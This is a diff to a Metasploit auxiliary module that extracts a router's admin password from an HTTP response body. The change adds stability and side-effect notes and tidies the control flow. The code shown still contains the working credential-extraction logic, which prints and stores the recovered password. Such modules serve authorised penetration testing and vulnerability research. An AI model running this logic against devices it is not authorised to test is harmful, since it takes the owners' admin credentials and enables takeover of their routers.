@@ -25,7 +25,12 @@ class MetasploitModule < Msf::Auxiliary
         'Daniel Manser', # @antsygeek
         'Sven Vetsch' # @disenchant_ch
       ],
-      'License' => MSF_LICENSE
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
   end
 
@@ -41,33 +46,31 @@ class MetasploitModule < Msf::Auxiliary
       }
     }, 10)
 
-    if (res && res.code == 200)
+    if res && res.code == 200
       print_status('Got response from router.')
     else
       print_error('Unexpected HTTP response code.')
       return
     end
-
-    admin_password = ''
     admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/)
 
     if !admin_password_matches
       print_error('Could not obtain admin password')
       return
-    else
-      admin_password = admin_password_matches[1]
-      print_good("Password for user 'admin' is: #{admin_password}")
-
-      connection_details = {
-        module_fullname: fullname,
-        username: 'admin',
-        private_data: admin_password,
-        private_type: :password,
-        status: Metasploit::Model::Login::Status::UNTRIED,
-        proof: res.body
-      }.merge(service_details)
-      create_credential_and_login(connection_details) # makes service_name more consistent
     end
+
+    admin_password = admin_password_matches[1]
+    print_good("Password for user 'admin' is: #{admin_password}")
+
+    connection_details = {
+      module_fullname: fullname,
+      username: 'admin',
+      private_data: admin_password,
+      private_type: :password,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: res.body
+    }.merge(service_details)
+    create_credential_and_login(connection_details) # makes service_name more consistent
   rescue ::Rex::ConnectionError
     print_error("#{rhost}:#{rport} - Failed to connect")
     return
